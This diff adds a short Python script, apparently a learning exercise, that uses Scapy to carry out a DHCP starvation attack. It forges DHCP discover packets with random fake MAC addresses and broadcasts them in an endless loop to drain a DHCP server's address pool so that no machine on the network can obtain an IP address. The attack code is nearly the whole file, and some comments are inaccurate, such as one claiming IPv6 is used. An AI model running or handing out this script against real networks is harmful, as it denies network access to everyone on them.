@@ -1,0 +1,37 @@
+# !pip install scapy 
+
+from scapy.all import *
+
+# Prevents any IP conflicts while sending the packet 
+# disable sIP address checking at computers 
+# this we do by sending request apcket to dhcp server 
+# with FAKE MAC addr 
+
+conf.checkIPaddr = False 
+
+
+
+
+# DHCP STarvation attack  - empty the available pool of IP addr at DHCP Server so  No computer
+# can get any IP addr 
+
+# Using IPv6 addr 
+
+# discover sent in broadcast mode to all computers of network 
+
+# BootP server (my PC) = has 68 Port No . 
+
+DHCP_DISCOVER  = Ether( src = RandMAC() , dst = 'ff:ff:ff:ff:ff:ff' , type = 0x0800)\
+               /IP( src= '0.0.0.0'   , dst = '255.255.255.255'  )\
+               /UDP( dport = 67 , sport  = 68)\
+               /BOOTP( op =1 , chaddr = RandMAC()) \
+               /DHCP( options  = [('message-type' , 'discover'), ('end') ] )
+    
+# send the packet (Multiple times in network with Fake MAC so to empty the iP pool)
+
+# ERROR KNOWINGLY PUT 
+
+# iface = None (uses the default Interface to send data packets )
+
+sendp(DHCP_DISCOVER  , iface = None , loop =1 , verbose = 1 )
+
